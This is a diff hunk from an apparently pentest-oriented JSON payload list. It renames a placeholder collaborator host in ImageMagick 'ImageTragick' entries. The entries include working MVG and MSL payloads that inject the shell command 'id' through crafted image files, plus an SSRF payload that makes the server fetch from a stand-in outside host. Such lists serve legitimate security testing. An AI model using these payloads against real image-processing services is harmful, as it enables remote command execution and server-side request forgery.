@@ -69,9 +69,9 @@
     "imagemagick": {
       "description": "ImageTragick/ImageMagick RCE via crafted image files (CVE-2016-3714 class)",
       "payloads": [
-        {"payload": "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://COLLABORATOR_URL/im|id; )'\npop graphic-context", "description": "ImageTragick MVG RCE via fill url() directive", "waf_bypass": false},
+        {"payload": "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://COLLABORATOR/im|id; )'\npop graphic-context", "description": "ImageTragick MVG RCE via fill url() directive", "waf_bypass": false},
         {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><image><read filename=\"|id; \"/></image>", "description": "ImageMagick MSL command injection", "waf_bypass": false},
-        {"payload": "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'https://COLLABORATOR_URL/'\npop graphic-context", "description": "ImageTragick SSRF via image fetch", "waf_bypass": false}
+        {"payload": "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'https://COLLABORATOR/'\npop graphic-context", "description": "ImageTragick SSRF via image fetch", "waf_bypass": false}
       ]
     },
     "nodejs_bypass": {
